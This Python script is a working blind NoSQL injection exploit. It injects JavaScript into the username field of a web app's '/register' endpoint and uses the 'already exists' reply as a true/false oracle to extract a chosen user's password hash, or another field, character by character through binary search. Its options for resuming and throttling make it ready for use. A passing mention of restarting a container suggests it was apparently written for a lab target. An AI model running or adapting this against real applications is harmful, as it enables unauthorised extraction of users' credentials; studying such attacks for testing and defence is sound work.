import argparse
import string
import sys
import time

import requests

# Extend if the target's hash needs more chars (e.g. bcrypt: add "$./")
CHARSET = string.ascii_letters + string.digits
TRUE_MARKER = "already exists"

session = requests.Session()
base_url = None
verbose = False
_failures = 0  # consecutive connection failures


def esc(char):
    """Escape chars that are special inside a JS regex."""
    return {"$": r"\$", ".": r"\.", "/": r"\/", "-": r"\-"}.get(char, char)


def matches_regex(field, username, pattern):
    """Returns True if `field` starts with the regex fragment `pattern` (e.g. 'fde08[0-7]')."""
    global _failures
    payload = {
        # full script after the server appends its closing quote:
        #   this.username == 'bmdyy' && this.password.match(/^.../) && '' == ''
        #                         the trailing open ' is closed by the server's own quote
        "username": f"{username}' && this.{field}.match(/^{pattern}/) && '' == '",
        "password": "randomvalue",
    }
    try:
        response = session.post(
            f"{base_url}:3000/register", data=payload, allow_redirects=False
        )
    except requests.RequestException as e:
        _failures += 1
        if _failures >= 3:
            print(f"\n[!] Target unreachable after {_failures} attempts "
                  f"({e.__class__.__name__})")
            print("    The app has probably crashed. Restart the container,")
            print("    then rerun with -k to resume from your known prefix.")
            sys.exit(1)
        return False

    _failures = 0
    result = TRUE_MARKER in response.text
    if verbose:
        print(f"\n  [{'MATCH' if result else 'no   '}] pattern={pattern!r} http={response.status_code}")
    return result


def dump_field(field, username, known="", max_length=64, delay=0):
    """Extracts `field` for `username` via binary search (~7 req/char),
    resuming after the `known` prefix if given."""
    extracted = known
    if known:
        sys.stdout.write(known)
        sys.stdout.flush()

    while len(extracted) < max_length:
        prefix = "".join(esc(c) for c in extracted)

        # Binary search: each request halves the remaining candidate chars
        candidates = list(CHARSET)
        while len(candidates) > 1:
            mid = len(candidates) // 2
            half = "".join(esc(c) for c in candidates[:mid])
            if matches_regex(field, username, f"{prefix}[{half}]"):
                candidates = candidates[:mid]
            else:
                candidates = candidates[mid:]

        # Confirm the last remaining candidate on its own
        if matches_regex(field, username, f"{prefix}{esc(candidates[0])}"):
            extracted += candidates[0]
            sys.stdout.write(candidates[0])
            sys.stdout.flush()
        else:
            break  # no char matched -> field value ended here

        if delay:
            time.sleep(delay)

    print()
    return extracted


def get_password_hash(username):
    """Convenience wrapper: extracts the password hash for `username`."""
    return dump_field("password", username)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-u', '--username', help='Username to be extracted', required=True)
    parser.add_argument('-f', '--field', default='password', help='Field to extract (default: password)')
    parser.add_argument('-k', '--known', default='', help='Known prefix to resume from, e.g. -k fde087')
    parser.add_argument('-d', '--delay', type=float, default=0, help='Delay between found chars in seconds')
    parser.add_argument('-v', '--verbose', action='store_true', help='Print every request and result')
    args = parser.parse_args()

    global base_url, verbose
    base_url = f"http://{args.target}"
    verbose = args.verbose

    print(f"The {args.field} for username {args.username} is...")
    dump_field(args.field, args.username, known=args.known, delay=args.delay)


if __name__ == '__main__':
    main()
